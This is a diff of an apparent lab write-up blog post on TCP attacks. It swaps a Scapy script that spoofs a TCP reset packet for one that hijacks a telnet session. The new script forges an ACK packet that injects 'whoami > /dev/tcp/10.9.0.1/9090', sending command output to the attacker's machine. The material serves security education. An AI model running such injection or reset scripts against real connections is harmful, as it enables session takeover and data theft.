@@ -59,33 +59,37 @@ The last TCP packet sent from User 1 to User 2 will inform the source port numbe
 The following code will send our RST packet:
 
 ```python
-from scapy.all import * 
 import argparse
- 
-def spoof_reset_packet(src_port, seq_num):
-  user1_ip = "10.9.0.6"
-  user2_ip = "10.9.0.7"
-  
-  user1_port = src_port
-  user2_port = 23
-  
-  ip = IP(src=user1_ip, dst=user2_ip)
-  tcp = TCP(sport=user1_port, dport=user2_port, flags="R", seq=seq_num)
-  pkt = ip/tcp
-  
-  print("SENDING RESET PACKET........")
-  send(pkt, verbose=0)
-   
-if __name__ == "__main__":
-  parser = argparse.ArgumentParser()
-  parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
-  parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)
+from scapy.all import *
 
-  args = parser.parse_args()
-  spoof_reset_packet(args.src_port, args.seq)
+def spoof_hijack_packet(src_port, seq_num, ack_num):
+	user1_ip = "10.9.0.6"
+	user2_ip = "10.9.0.7"
+
+	user1_port = src_port
+	user2_port = 23
+
+	ip = IP(src=user1_ip, dst=user2_ip)
+	tcp = TCP(sport=user1_port, dport=user2_port, flags="A", seq=seq_num, ack=ack_num)
+	data = "\r whoami > /dev/tcp/10.9.0.1/9090 \r"
+
+	pkt = ip/tcp/data
+
+	print("SENDING HIJACK PACKET........")
+	send(pkt)
+
+if __name__ == "__main__":
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
+	parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)
+	parser.add_argument("-a", "--ack", type=int, help="last acknowledgement number", required=True)
+
+	args = parser.parse_args()
+
+	spoof_hijack_packet(args.src_port, args.seq, args.ack)
 ```
 
-For convenience, I designed the program to take in arguments for the source port number and the sequence number. I invoke it as follows with the source port and sequence numbers taken from Wireshark.
+For convenience, I designed the program to take the source port number, sequence number, and acknowledgement numbers as arguments. I invoke it as follows with the data gathered from Wireshark.
 
 <figure>
   <img src="/images/2023-04-26-tcp-reset/reset-attack.png" alt="Program invocation">
